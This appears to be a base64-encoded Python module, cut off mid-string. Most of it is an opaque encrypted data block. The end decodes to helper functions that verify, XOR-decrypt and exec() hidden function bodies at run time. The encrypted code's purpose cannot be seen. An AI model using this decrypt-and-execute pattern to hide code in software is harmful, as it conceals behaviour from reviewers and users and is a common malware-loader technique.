SHpqT0hyalU0SEltWGV5bWU0aCsvbVF5ZUsvZCt4cE1jOFdIOFFNM2RhcS91eWNzZ091d29XbmpFMkRUekJ4bFVtUmkrUFROay92NjZSZXNINldyQUFheTN5TlVJdC9UYkhnWE9GWmFDeFVxTGNJS2lCRlZ5Q2xwRU0wcERKS3hhN2FQV2NGaGVNdDZMSVNMUWhlWmI0SjlxVXRJSHJxNUltMEswdUR6b0txbU9wSHQ3K1IzK1pQakR3V2l0VStIeitvVm1ycFM2NjZXd0J6RzV2N3hJT1JERy9iTzlsRFQzTFk3cCtEUTM4NTJmSTRhckIxakZIMnQ5MmVvNWZ1d2VTQVNyUHYvQnBGYnpWdXZkcEdNcXFDdWh6M2loNjhGMnFKbVVKUE0vZVEwT3lrajJQY3cyYjF2WEw0d3NNbVd6V1VMV1BSODFwWUs5NlB1NTFoWnFSTVlBTWE2VGEwaGJNRGZ6UFpCVkNyK2d6OE1kSnZYc0VMdWd0QmNGT1c2SFRGbXd0djh6ZzFua1N1eHdlVnFRYytjVURqU0h2Ry9EVlpFTERPRHJodVVxOWN1Z1hqWTVDWmc0UVdYbEtLVzZvT3dOYktGL3RIL2hPZEtHR0VzaUttMktEcUlTekcva3FFb3FDeGNmVzFvMGZrSmt6angrWkNEUTBnSmg1di8vL3lMdkd4dS9TZzhJRWNkRW12M2tOM3dJT0pmSjF2YllGR0grUXE0SDdDODl0cXMyaEdQVHliSjNXbzJDR3NuTlBLSjRQeFFackp2bUFRMW5GcjFDWmQrL1lkbVJFL2xibXB6SUU0eDNwUGhPWFptOUsrOEtoYTV5VVNidElSVEhtUHZiUm5Fa25kOVZmS2pFdWtGa20yaGN6Y3dWL1NhYk1xa3Z2a1c4N1FvK0t5anlmYVovUkNVQWtDam9pdE5BK0pqTGZocXlRMmZlYmwzc0VlZ3lmd0F1WTBvYjEzRTRKRjFkV0pxaEVyd3N4TnI2UnNWbHA1MHZ2d2oyZ215TklycUNuZmZNanNDc1cvVm16dmRRK3FMZG9YUHdpcU5zMUd6UUt5SjZKQTdNWWRMZkVsT0pkeXB6bWZsTlJ4SEM1dGJxdmVZZVpINk1TUHExMXc1K1hxdlZKQSt1RUlvTHNDcUpNS0hqTHUvcVc4UDgyclphUzJuQWZQdnVXcXRSNFV1Z1JrZW11Rk5SMGRmeGtxOGhJNEd4dlNVUkF1V01mcSt6RC9lVFZMWXptZVBpS1krWTdncTBQS0FSVEJKditTK0tXWVh1SGlKZEFmN0JoVHRxWlRTYjlTazVETnBKWjVvWFdMODNvam5JeUI0TXRvUFdJQzNEbTVIdUJ6dlBkTHNNL2NJMmdyVEU3L1J0NkRtQklQVWFjRXB3N1VQR29yWWg1NXNKVWRJRDdPbHRTMmoxVDhSWlN2eC9lM0gyeVRONWNmMEEyUGNjN20xZTBsMVpxOVlCeThxWHVrL0pMWVJJQ05idDZHQlJKWHg0L0tXcG52cHgyb1dhQVhUbkVFQXlMTGZIdG5KZEVVdW5scm1jSzIvZWt3UjVCc2lrSk5QQjhJclpXaGdIMXFNMFlyUEZsQkZFMyt5Q05mVUpMMWFaTk9SUTlEbFZkM0RrM2cyTXNyZXZNUVNDa1V3SHg0enNLaFBOS2lZbURJTGs5Q080T01odTBUN0JobG9WcDFCVzAyV1JvdVJXamxSYlpXZ2k4aWJabzkvc2lZQnlyaW1DQXNibW9pMW1LNFVyUm1kQjhOc0xweGVxMnVUZTlVVzAxbU9KQ1M5cDdQVTBjanFwS3ZMNEVFSXJrSWh5WldLNE5paTdWM01RQ2hyQ3RBTmJWU0RzUlVRUENhRVhmYWJxT29USHFaS1FTZU9sb0hvT1VsWEptdWowN1lnSENYcHk4S3ZIRG1oUWloOGttVkFldHhOVnNJVzFlYjgzbGc5eGErVUdhb0lNcU1Xb0RRMzFFU2RpNDhmRE9MWEtZd2prd1ZEdjRmUnZxdStmYW1wVEZxcUQ0N3hoSnI5dEk4NUsrVHJtaDFKMnBlNU9QOTlRRjBOb09WNUJHQlorNVF3eGYxZEFaZ2taN0x2VjZYc3JCeGFVU3BJaVlUSS9vZmg5K3FRY0V2MXBNUUplK1pvMWxlQi84R0hueE5LYWlNUzJSdC84Q1VCb3dURHlhNmEzQ2E2eG5ZcGFxMVdPajVsZlN4aHJRcDdrdm8wK2RDV2IySlIwaU02Yk9LWmZPdmg2K29XdDV4dVVMaFZHRUs4RW03OUhFRXFjT2c0Unpra2hnUDkyQ0JGbVRjN0t0V3lnSE9wK1VOd21KN2piR0E5MXFERlhodWZsMHAreDhTalVjajFlbFJ0elJGd0lhYktYaGN6MFlHZlc0ZFh2WSt5NzQ4d0RNMjRHNTRKcVQ0VmFLNWVDWE0wT25iYTA5THFhVGVEazJFMHlCRVY1YVo2QnJLRmI3dEsxQjl5NHoxZXlBZDVKTms2anlKdkZQYlVOODZlQ0p0MkZPWmVzNEF3enNFeG9DdWY5OVdlUWQwSk8rdmZNUk1ncmdtaGZYRFozN2xnbFFOZXhKRUorL2dvNU5zTTV6SXlHK2RFOEhRdjVLQi9tRUhPRldKaHMyOXU2TnAyL2lGbFpKdks5OTdlYm96WUtMV0V0QjBOT0haU01uQVNvamxTdGhMZXZ2TSt1U1VLNXFGZ0tYMEpQSU9HZk93blpLVElEYlN0N3UxdnRxQlg0UWZvNS9FZmhMQ3YxZWVoeU9EVGhOWmMzR1pENEZrc3UyM0NFUFpPeHVPY3luMTQ5TUpoNU8xcDNYMjkzQm51Ym9OcFordXdmaGt1dVhXMnRuOHdZSVJBSGk4N2RYNXVnU0NJNzdJeG1XZ1NJSmJoTitIVlRKZi9iS0R4NzFqOHJZSzVlU1VRVXRWUjVzaDRBWUZjMVFEUVVZampDSlM4RTZuVnhMYkMreWRLbE5HUzN5QW9kZWw3Zk0veTQ4ckNRcVNqQWNmaC9PVmVNRlpPZ3RVQkpWVG8wZ1dnanNFa0VhKzNEeXM5YmpyRHZnd3huT2JvZmNLUU9oTTdqQ0dtQVA5bFA4ODhzTzgyVnRHWVlJanE1Yk1YaG4vUG5Nalpld0tjd0dDMDh4bDNNNlArdUs4SW5OUU1HWEdzWWR2TDJ5eHFuZ1lDY3B4UVcvUEJqcVVMNXA1YWxwVUo5MEh6cG05bjZtemdvWlJRQXNteHh4L0V2cnZxdC9lNzNBUFNUSGN1WVBrbGpXTzA1QnRCcTZvZW9pT2x5blVaQnlSTDhQMitvdDNWckYyMjB4ZnJLTUNuYkJxVitOMWRNelptSEZJcGJ0ZkJwT04rY3lZdllYK2cxZU1NalhBSjZjSzlHclhtUnFWRjJKTTNVdGNNcllTWjZxRVp1MWdOUjVuUG5tVkdIUGJ6eSt2SkFtRy9qNHFsRFcvQlJXb3lpeStLaFhEdEZMaFdDNG1kZ2NRbFVuWmlKTm5Cakcxc3B3Q0ZQVld6eE1QVFoxNWN2K1hoVkZQRWlZN01TaHhFVElQSkwrMDkxWWF6Zk1zL1VVaDdOZ0ozMitpSjhBcXlrQ1dJN3BZNjF0ZW9UVEVDL0pBUFdVSkwvZFpMdWdjbHhxVnZWQXFTaHdFMmNEN3FPU0Npb1pqdHlJTE5PYU5PaTdpeTU3UHp2NC9ISXZ0NEl6QW1pYkRhMzJmZVVFamoxT244ejJWYlNRV3hLdHlHMUxWdGZVNjRlK0NGNU5nL0NDS0E5enl4S1d2Zi9ycDdpN1ZEeFd3aWhrN0YzS3dkOXlQekxqaklMVjRWZXlqZi8rSUlsNVpDRXA2L3lER3d2eEoreTVNbUlsUVNNWkI2QlBrNHdqdk85VWZmdDJCMWhIVVlHMTV0T3RVaHNaR1pxcVZRL21jTEFKRHUzSEVOc1pRZSt0TFZjNkNzRkJFQ0FDRGFMQzFOaHlTRWpVbkZ4dW9BWVVuSzVONlJLZDdsOE9NQ2FHbjJJOUtHbzc0dFJGYnRWd2h5SG03R1UvcU5IQmlZczBzTUY0amRSdDh4WjhKMDNtT2IwdU1GcjVIekZ1ZDNaMVpTQUo2WkJTR21jQmJIRGF5a1hoVjJvaDNRZkFudTB6N3M1RXp2ZXpXU0h5NHlHRFY2MWt5MGhzSE1aRUo4MktSWVdJd3VyMjhnd2EraUU2M3dnbk8rWEhwNFlIWnlUVS96U2gxNnZEY2hZTng3MUlucjlGYW42TE1ibGVrd0RwcFhPcEYzMDRIV1Y0UnNNaDV3OUFoYkttbGd1akVoUW9jRDdUMklJRUlNZGZQN21VajVOZEpGVXlXMk56T2Z6WUVXVEQ5M0FoQ0lKL21xTGdtZjdnZkllK2xqUjVRS3QreUo0VXZnclNvZ05GRnRFMTh1aFZNL0hTSVNGdGo3QUFxcTY3eExNMC9nWi84Qkd1SkVZQTc0V2FobXRMWjVsSUh4SGcxQjhpNEZieGg2N3pIWTVWVTl5cVFIeFlhd21kVThRQ3NBa1Z6eFZVcy8rdmV1YXNHNDFrRXVEa01PNXFIekNpYnBBOVhGeFBBWEE5SVl2TkFrL2djUU9HWWsxb0VhcmRRV2RuWndZNTVPWEtldXNDQjlSUFU5ZmdzaVhYZE02T3ZXWXZsMTRFcW41aXNjVzg4UEZWOCtCUFF0d1gwMmRMQjlLUjczSWNlUTlPNDc2ZkFoMzZuUkhiejBhaHJHOG1XN2Z4Nit5SWM5OXdML3YreWxsVUl1dHJ1Q0xiWTMrY3lmU0tWWlBMVDdDcFBsaUV4a3hjSE1aNElkQkd2cFBKdEZQSnYyS0pWVXpZRkprNHF3RktMQ3MrU2dlTVFHSlZLd1RRR1VPSk93VlRiaVdGSUs1cnlvM3VaeE9neURPcTBRN1c5dlZrbUxhWXdwcDBMeUU2K1J0NHBGMUJsUlV1TUFTUVZZNVpxR2hOVHdCc28zbFF5ajdwVDRmS2JjVzNobThKdXd4NWkrNE1yYk9oUGVpRjlROGExNkVrNzNCS1VDd2d6VnJhZFJWMGM4L3hMNmN6cWNJN2FRSUszZWJTQUlhbFloajVDTnpqL1hLb2ltc0V4dExTSDUvR0luSHo3bDR5c09NMVhoSkdWdlh4RFl0T2JFRGxvbG9aOTJYSGVRdWFkdlVOck5tcldINVJsSXJGWlhtYXQrbS9XanNvUG9hT3dFSi8zMktXRmdjV1RLWDZ2L1ZGSmF5SGVYV1d6VHNrOC84VDlQUy9JallxazZ0dy9oZFozSVk5UDFmVDY1UG9kN2QrZERWR0FDVUVjMFBoTXVDUkthTS9oblN1RVBmYU40azFEeXlqUytTMjVFTG5WWjM2ZWdFazFjaEtUUjcvODF6NmNTL1BsMVFPQzNBeDRUNSsvUDdNSjEyTi94WFEzbmVUQzdjaVZyaWl5R1A4QWRlamFpaVNIekpSaFR1U0llYlU2aFNtNWNVNy9JTWxXczlLekZpL1lGNEg2YnVCdWdCWStJNnNkUlhjTnNvNzB4ZWJwbWxZZyt0elgxM2R6WWpOUmtIUGdXSWhvVjkxSURDK1MrVjZEZHJ5RHpJMjlpL0VZL0lKWDJPTTFTeUgrek85SzY5ZTdhdG5RblN4Yk9zMldUZnVqY0lERng2WEYxZ1NtN0s0aGhWRkNKYzBoOG94Q0V6NksydFRIYnhZdVAzL2NlQnA4T1ZSRXBHVUphQ29ta041RUFKOUFJYVpYbFN5bU5BNExERzhrdDFDM3hPNUhRVDFHY2d5UzQ4U0hHMmpoVzZhTmJUUmxJSFNYanB5V0V2dENKOEJyd1Fva1p4TCs5Vi82dm9tY0FHeGlUYTNTQkV1ZFkzaDI0YUNqdWxWZjdVT1hydXYwVzBHKzArTUhpVWxZVDVOWWZZd25GdFhNRU9HbjNyODBKcjFNRldVNDNHcXVHL2Z0cGxoRU9iTmRXNkpocnY3SGFVaDArdFdGRGQyK3lXdThnd05hUDRhMWgwQ1o5a2Vpd1ZXbVhFUXk5cnBCVmVYMlFaNEZCam9hTUhEdFdpZTFIZTF3L3FBTXZkQ1dMWDZQSHpmanFROUR4UFFLdTdVWkRkMXhnQXYxNXlqdGhsNVhRTU8vWlhwdlQwMmlRMG9rUGROYXJPUzZ4SzBjZmVURUVLd3d0UnpvRjdnb0UvUnZJcDBiVnEza0hnTjdvVmhvcnpkZEs4OWZsVUZzMnlQRWp1SkF1R3MvSFZpSnpqVHJaMVo3VjJSZVhmbUhQdkt4K05nK3lzVFZsTDVHZlBFZEhvRkc2Z29wUzhhVjBhR0t5eHh3S1dsaEZES2ZIQVZiV2RTRStTSk9tOE5lQmdIU1RmK2psV3RNcDZXQnBHQ0psODR4RnV3aEhKWE9BOXk1cHROdWxobk4zMDBmMmtjYzhvMjRCenlYcHFoVzBWMVk3OEd5ZDFuL2E3Y2NKcWJBTXpVZjdNY3JqUXhvOFQ0SGVaUWpuUXZabEQrcm9wSk1Rb1ozRjNia042VEV5SkZjS2JmTHpwOWUrTXYycDh3eTBvc2NJZEtuYURZcHhsb2xKMlo3bDJtS2FndWhSMGlqcTZ2U2ZUZ0ErZmRtN3RPaFEzVE1vd1JPZXJScnRSZWNpaEFRbytvOENnSDluZnlCaUV1WjRhVG9zWkZtZEJjNmg5bHVaUU1XQTVucjVTZSt4Y2IwcTJSMThnYkNGbGwzaWNPb1NML2RWTmNVYWpvc2xKajl4YTNyVkk5K2ZaNmpYOG5oaVFIRDZzVTBQaThwekNaTlR0MkszTnJzd3BmUkhmNG9VdERlalV1R0ZrQmE4dkxCMGhhSnhjR1UwclRDa255Zm5zVDU5NDZhdWpEZnNOM3RVSGQvTzRIUmpzdzRoanY1akZQdVRUTUlVbWxta2JrVVZPTzFTOE1RcEE5dVdCRTNDVUp6b3dMVGtWNTBURGFYaTM0a3IvSmRrL1ptMmQ3RlBZR3dvWkEzS0d3SDdKNXlGWi9sYWp3WjFmYTBwVTdaZnRMVUxPVXRDRUp3SUNsanFyb0tTNlBGMElmZ0xpcWtNSXBXSHQrR2NtWTBjb1R3a0pLV2tvUkhKZWNteEFjSityTTZLMFRLNisxYklCT3Nnc2YwelV5S2wxbWdVYUNGTjFKSUNqanhuNDNFQXFGYkJmeCswWUowWTZFbWEzTklZK05qVWFEbitycXQzWkVBUjNzb3MrVXBQRElJZ1hVdzNybXdDc0E0L0pXYTl3WTlNZnpXVTIrVjVpRWxkQXg1ck5zR3B2UkRpSm8xbXAvMDNmSGhhVGp5U2dFVFdxd05WRmNkQ2J3WE1Wd2NDcmhRQVlMWnVOdy90MGVzWld1dmxKalJ4MGZPSVMvWkRST0wrR3NDb09WTVNjaERHdWJMdWVHL3MwOGtkZExGVFkyaEc1UVdkVnpoS1FHcStkUWxia25ESWR2RWxBVEpDTkFtd2J1WVBxMTlnaGhFTW1TaXVKdytSUEVhbFdScFhQN2ZUd1p5YUMxcTl5Q2xRNm9VWkxpbjlzRDRiYnFRbmpuSmZkYWtFTEJzZXVMTFJWV2RnN3UxQXdob24rRFFueTlVTzZlYXpab0VlQXFpbzVFTE5seEJ4SXdYaGpBRmtQTmxlTW9IUUpYQUkxUElnZHJyaTR4bU1XM2kyNkgycS9ISTlISWlaL3ZSRVR6WmlLY0xmNVA4UUMyTTBubFlNbkRVbVhVbU9wa1QxVGk3bnZCejlldzkybXUwR21DVVZxSEs1SHVEQnVlTS9DTDBraWtmWG9WQUpXOWdCZFRZMzZDOTZacXdFaU1TMHNCZTlLSHdITTEwdFUvUnBrdVUvNlhnSEU2QVhIWGdPbklYUzV0VzhKLzJTM2ZDVURuQW9mc0JGMHF0ZG41ckpzS3J2cXBIMytwQ2Nia29CbHJ6SlEvNWFmTDFHYmc2eEoreHovZHFMb2pqZytYT3M5NWJDODhVdDJMMnBaTG9mS0xjb0ZyVDJpTEpBdkIrM1o2MElsY2V3WUZlQjc4UERtMU03NnFydzFjZVYxL1VRc2ZGUXh2OEhNSU1NOUxiajRWa1ArVVgvVUF2YjNrWUllNmkyUnhMM2ZVN2NGYmYwUXlpS3d0Y3dXL09aNlFrbUhCSDQ1MFV0SWlXSGRJemxrdTU0anBveEk5cjhjUkZtRXRJaEVmSWVIQ3U0N0lxR09hZXdCQ09KL0wzbitOelJQT3VWTVlWNzhsR1BQWTA0SU45emQxZFZzZGFaT0tCeEdOTHBzbFY3ZmNla0d0aUI1dWlteEdPWFhDU2FDME1qZS9YdlJJNmo4Q1N2Wmgrd0ZXRjQvekRmcEJtWEl5OFBKZWszNldTbzYwelZMWWZhZzV0eC9BT0FVcEVwcHdFcU9oZ1dYVSs1ZVZoOW5nSHN0MWszRzV1VHJXeFJ3bjdjTWhMeFFBZTlQZUc2Z3Ivd0o5THVxZmpMaitSQUVVWFZqRFhRWEkyRFM4V01QWmZ4WHRXeDdsdHVILzV0M1A3cnRuZ2YzaXRWUnBIbTBwSXVaNWtmRmVXdWx5S0ZyNENCWFZFVlN2Y29Fb01LcHhHU056NzdUQlJmc05qNFlnQm9FZm1jcENHNmVIVVNCSUNEeWNvVzBjZi9PZExkemNTWnZJS2lSUlJMVkZ0a00zanZ1VTVEM0lKWVBxcEh6UlNVbktua0lsM1VKZ1lrOUdVcmpZOHRSZW9GbU55K3RlamFTZ3h0MHVRaGtzcFRuZWFQMk5pMTFPZVNqSTdWRnhOeFBTRjNKV1gxSWRaTkJ0aDdhV1VISmp6azF4eDBSeEgvbHg4cVk5OWtieDRLV0tJRFhlMklQZlNWcmhCYmc4Mmg2bERPODFET3Rsb2ZjZElBSTYraVNGRTN6NnRhNWRaVUlLVU5ZcFRXRUJJT3VUOElSY3FZTHE2ZXB1S0V5c05HNFVSRnMxTk5Id0dOcGdnaS9MeFViZGZPSVdVWUZGOFJlZ0lOdHl6S1hEU0RDNEdHN1NLUGNBYVB5SENDMkE4MnJQYmtkMkMzcmd3b1FaWFVPaklCZnp6SmU1R29vRzhzZW5yMEI5KzBJVkNOWGtrdEdzT0FsemZ6OXg3aXN5b3drRG93NzN4RUgyNDdERVZlTG45czVKaW9lOHZmQTZuUzQ3dEpWbkFBWmR0eURjWWE5Vjl5Vks0a01PU3E2bVJIZXhVYXdyQU5RTHhFSXFGSHJpZEUxdGp6T3kxbE83N2VXQVhKSXl1anQrand6VTVTUmpFeVhUN3Q0WERTNm90WDlaRW5OMzJrT1Bac25mMUlscFRsMUNGcWN5V3Z6Y3FWRGczRlBmckhWRUlYVVNDYzdYM21OTjhsUWw3QTIxYjhqdW1jdEpUWHFZMXhRaCtHK09USWJpaVN0MlZyelo1TDh2N0ZpbmQ5aXNma0x2WnZrdUg0ODlxaHBsVkVWNW1kbEtLM1d4RzZLTzhPVExtMmUyNDZuZ2xwaVl1Tk1kSDFhWHdZeWo1VHM1SmV4TCtyRllBUUF4bWozSHN1OGpEeDlTT0J4K0ZRdmlEdGRWa2NLeGpuQTlCSzNoekJDcmp6WW5xeHBpbis1MW1obk9HMDF1emlyV3hCUXE2ZnN0NWtnOCtERE9EMW5DU2dmcUcwUXZCWmdrZjZDNkQyMXNISWxxT2JqVHVrdkNhMXA5TThnOVB3b0RBeVpaTzNweC8rdElWOWJxUWRVRmYvSTJydGd3VGhlV0FtWVVBZnlnZ0NSRkx3VHFmVmpRZFNBVjRmdnVUUjF6Q2VuOTNlWUFkUmJsTVoxcU41Tm43R2tFV3VFODM0SllxRVdzVk5ia1hPL2tXZWpvcmRxMmo3QTF1N200Qy92SWVGdUhVeFMwRTdkNzBJY3NVYnNRU1hlVjNTUmJQSnB3NXhoOXluTC9qSW9zK0NneXBlSUhQSEp6UnhMZVVmajhOR1BnU1p3bWFDcm1mZUIrd2Q3WlZtSHAvTGl0OVdRdXZWOFdQUlZqRHhVU0dFZmxzbExSMFkwM2xRZTJuc1VyWmFJZzYwelh2OXZycUw1Y0ZKWFowUFY4ZUxXNU9SMkx1UXQwbDJEV1pFTkxRYkk5TVBnZWZOM3pFMVZNMG9LcHNMdEIzMzNwWm51OXExU1pvbi8yT3BUbHE3YUI2ZHdpUm05QlpYTUQ2RFh5NE1ZNFhZM2Y0UnlDMUxGSTBoWnVXeURUcGFkWlVjMWFMQndGUW1oT3M0UTROR1VuQm9HS2pYbmdGU3dqRGplYVV0N09XMllCMFVlelBJUzBFdkQ4VXRjaVNwOUM3M3M4MXRwS2Q2NFplUGNEVG9YK0hFYnRkNUdHaVduaXRZb3VENnFUZDl4YnFuNjNYZDNtMDI1MGpzOGRUREVWQW81ZDVRTEd0eEJXTnZ4VW9ScHNTTmtGTWdQTUo5ZUxtemszQjJTUlZWR1k1YllNSWF6YjQ1cDFrTGVsOGVXSnk5cXAwWER4V0ZUQXFVZzN5c0lNTUtFOU8rdk96L3FhT0pvKzAzTzRjRlk4anlqZkdEZXlENHhBS0xERUZNUUoreGIvZDRzMVNhNmlUWENuZ3pxVHhWbS9naUgxbDNkYkhIQXRqcUNJQ2Z1SWs3ZGdIL0wrR1dQV3Y0azcvV1cyemxlQzQzVXp0RExKZWVreFdYbXVTVWxRdmlhaWx5TTNBVStDUXR4V1VtOWM5V1ErQUVVblo5NDdjUXZ1WlpReWFCbG5wYmkxNG9wamNtOEd2L2JBSFlWODhOYU1CNE4vcHUvN2M1WEtOcmNieVVUMmRHTFNXc1ZTb1k1UFoxbUpSbkp6alJDbG5ETDZmWFdMcWljVW9CMTRGaGdmd2RxdlNuQUZqMWsxN1lRaW5hZVhWUFBXUHRMVVNLZWcwdTdUWTJ1U0Joc0kwaVBvU1VHbnFidllmekxpUEVLVzZHMStURmdYZTRqck8vbzNibVpvWldlRzg0RlVGQTVmUEkwUkpVR3NjZm1jNWY5QlVGRHdKeTBkbWRLSHZDRFdkdVU1NngvelFyNlJFei9oelEzR3ZNNWtCdG5GOUo4TkcxMXhpZkxsMzZkMlJ4NVlWTFUyV09WV05UZmMxNHlCbnFkQ25KTFZINmczdFFScWpjcFoxMGVZSStoV0pwVnJDcEcrMGFNVjRKTlVhYmVlaFpYb2Fvb1JtT0l3cDZnd2xFcVFuZjFGYkFkQ1UzRjlubklETmpLRHFxWTFWcjNBR2FkUjlRdnF3UlpWY2dPZ0Rkcmp5ckhkcGluVVBSQ0FjV1RxbSs3VWwwRlRHeHdRMnZVcHdzOFRWOEdWSG1PTk9xdEJsMDNhdmtHaXVVNmtOQ3gvQ3lOQ1I3NjRMR0E1U0M3ZHJFYThXWVBJekVRNm5Mb2VOODhyQS9tYnFWclc1cllwb2xCS2xJZENKcTk1OXAyTkpPWldBS2NTRzcrelpKVDdIM2xBb3JKOFRadEZBTGJHNGdWeE0wMU9aNGpRL1ViczlzMWJGZ1huM3ZTajI4c080ZDA5eXR0bERLeFV6eWNWYTg4cnQzOSs5QmIwOFcwNlEwZkpHRFpYbXdQZEZPYWZESEJEZ3pFTVJldkk4ekRKZGg1OFJVWEhBc3l1c1Z4R1Fjd0NMNG1WRW8wYjVPRVVaNzBQUHY3a3N4ejQzLzBVa0NKWUFlY01FUUtUS2VJUUd0TGsvWHpnbXlhTC9aUkpuMUhMUEMyTVdxcGF4ZUdVUnpVdG5ndksraGVncGorSVB6b3BiV2gyc0IvYVlZYjBRRi8yekppNVgyZXBxdlhhK2F4VlNzZE9ZL0JpMzE5ZUgyMUVEaTVZa2N0NDVuZEpHZW1IQUV4eXFPc0FWL0JQM0hYem4ya1BhV2tVWEp5L2NSMkdPakpQclVIaGt6UkxtNi9PWU5yQjVSS2E4RGo1UXhBTVpQSy9qTTRrdlVmYUFJbFRmUmlzMzd3UHFJbmlIY1dtb2ZhSkptUkNpVUFRZDhLT2NhWnE3a0VkaUlPT3F1clc0VTF1d2dzOXVkMEgyQlNncTlRVXJzRm5FR2ZsL2YzdEVTc3JVeHdRMnIwVUs4QitRSS83cjlvaHA3SWZZZjhRdUV2aUQrQ04zTnFIVm9YVyt2bU4rN1FVYUJQUmJ6S2VIR1FiVEpZZ003Q3hQN2NWdGxiRzJKVHQwWTBIeldFbjVVREl0R242ZzZXOWZNYUl0S25haXBESHY2UVZCc0g5Ri9QL3lzV1BQZUxGM3A5YXlPdEtSZVkxdVFCNTNWVDdnMldBTUlkWldPMnFKbmVSbm54K0cyb1BXait0OE1idEJVeG8ranRjeHpCNVVpUjdTK2tnQnBmQUVOL3NkdFFxV0JVd3JkWlN0aDBFUkgxVVp1WDJWc0JPQ0JNY2JLdzNxTUNGemRmSFlZMzRsbkJFbGNqM2xWR0gyWjNXcCthbDh0aDVuTGFZSHRCWE4wMGZuRHN4dzhiak54R3ZFMXgxUXg1Y3BjUy9peXRjREVsSkg1eGVSeFJwN1F6eUJ4WnhBUVdFaVFJSnRHV2ZLcHl0dEVsMS9hV1NGT2hqQWdlUUl6T3lVbXNqRGpNUjUwRGVWK1Myc3k5RWhNS09wY01HTk9rQTB1RjRQNmF6Vkl5V3EzMUJMK3NicDZ4REZLUjRWeXp0MzhWTFdTd2FCMDFNcjc3VG1saTFHbE8xUVkrUFFLVGNTcGRCSGtSalJTc1MwNnQ0SURqTWlKeDBhS0V2ajAzSEpEbzdGcnVGdGc0SldhZ2paS3RBSlBjRGM3dCtlMkFlcVYwYnpLUEhtVDlKQXZjL3BTY0ZwM2pUaVFqSEF5alRlcTVnbUh5cnFKS2FiUVV3QXFOelFhUjBxSTZ0TDVoZWVZOXpGTHM3K01yM0VCRDBIQWs5Y09mK2Yvd3F1bUQvNVVDV3FYazV0V2JIeVM1MkhaZjVRaEtud3ZVSmxBVGtFVzI4SnJ3WDNzQjBJNXJRZGF6MUhDNFo0c2ZMRTVkd0I4cS9ZS3VTNlJEcDAvbFRGZ1dIc3ZJSDdXMFZrUDFEV082dkd2bnN4Y29XWkJOUVBRNGtCT2hlZjB6TS9GcFJwQTRIT0dZczZweDZDNUpIRVNiOGUvakZqUFNLa0IxM2VQR2xCc1g0MDUyN0pwQ2ovandhTStxbTNJSlNSNWhDV3V6UWpoUHFPKytSc0Vmc0VadDJiS09KdldSNTlsaHNlcUphSjNvWThjb0NRWkFvaEFsZFYxUC96UGhaUUd1Z3hzdHNKaHVYbG9ZSVRBZ0VRRUEnKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3